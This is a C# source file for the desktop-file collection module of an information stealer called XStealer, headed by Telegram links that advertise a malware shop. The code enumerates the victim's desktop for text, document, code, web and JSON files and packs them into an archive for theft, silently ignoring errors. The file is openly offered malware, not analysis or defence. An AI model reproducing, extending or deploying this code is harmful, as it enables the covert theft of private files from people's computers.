// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class FilesCollector
    {
        // Расширения файлов для сбора
        private static readonly string[] Extensions = new string[8] { ".txt", ".doc", ".cs", ".html", ".htm", ".xml", ".php", ".json" };

        public static void Inizialize()
        {
            try
            {
                // Перебираем все файлы на рабочем столе с нужными расширениями
                foreach (string file in Directory.EnumerateFiles(GlobalPaths.DesktopPath, "*.*").Where(file => Array.IndexOf(Extensions, Path.GetExtension(file).ToLower()) >= 0))
                {
                    try
                    {
                        ZipEx.AddKeyPairStream($"DesktopFiles/{Path.GetFileName(file)}", ConverterEx.ToBytes(false, file));
                        CounterEx.FilesGrab++;
                    }
                    catch { continue; }
                }
            }
            catch { }
        }
    }
}